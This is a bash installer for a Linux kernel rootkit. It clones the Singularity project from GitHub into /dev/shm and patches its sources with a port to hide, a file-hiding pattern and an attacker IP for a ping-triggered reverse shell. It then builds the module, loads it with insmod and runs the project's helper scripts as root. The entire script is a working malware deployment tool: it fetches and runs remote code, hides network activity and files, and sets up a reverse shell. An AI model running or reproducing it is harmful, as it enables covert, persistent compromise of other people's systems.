#!/bin/bash

set -e

# For the stupid reverse shell we have
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/snap/bin

# This script needs root to run

if [[ $# -ne 6 ]]; then
    echo "Usage: $0 -p <port> -pat <pattern> -ip <ATTACKER_IP>"
    echo "help:"
    echo "-p <port>         The network port you wanna hide from e.g. netstat"
    echo "-pat <pattern>    A string pattern that will be used to hide maching strings in files and directories"
    echo "-ip <ATTACKER_IP> The IP address of the attacker to send the ping triggered reverse shell"
    exit 1
fi


# Parse arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        -p)
            NEWPORT="$2"
            shift 2
            ;;
        -pat)
            PATTERN="$2"
            shift 2
            ;;
        -ip)
            ATTACKER_IP="$2"
            shift 2
            ;;
        *)
            echo "Unknown option: $1"
            echo "Usage: $0 -p <port> -pat <pattern> -ip <ATTACKER_IP>"
            echo "help:"
            echo "-p <port>         The network port you wanna hide from e.g. netstat"
            echo "-pat <pattern>    A string pattern that will be used to hide maching strings in files and directories"
            echo "-ip <ATTACKER_IP> The IP address of the attacker to send the ping triggered reverse shell"
            exit 1
            ;;
    esac
done

cd /dev/shm
git clone https://github.com/MatheuZSecurity/Singularity
cd Singularity

sed -i "s/^#define PORT .*/#define PORT $NEWPORT/" "modules/hiding_tcp.c"

ESCAPED=$(printf '%s\n' "$PATTERN" | sed 's/[&/\]/\\&/g')
sed -i "/hidden_patterns\[\].*{/a\    \"${ESCAPED}\"," "include/hiding_directory_def.h"

sed -i "s/^#define YOUR_SRV_IP .*/#define YOUR_SRV_IP \"$ATTACKER_IP\"/" "include/core.h"

make
sudo insmod singularity.ko
sudo bash scripts/journal.sh
sudo bash scripts/x.sh
cd ..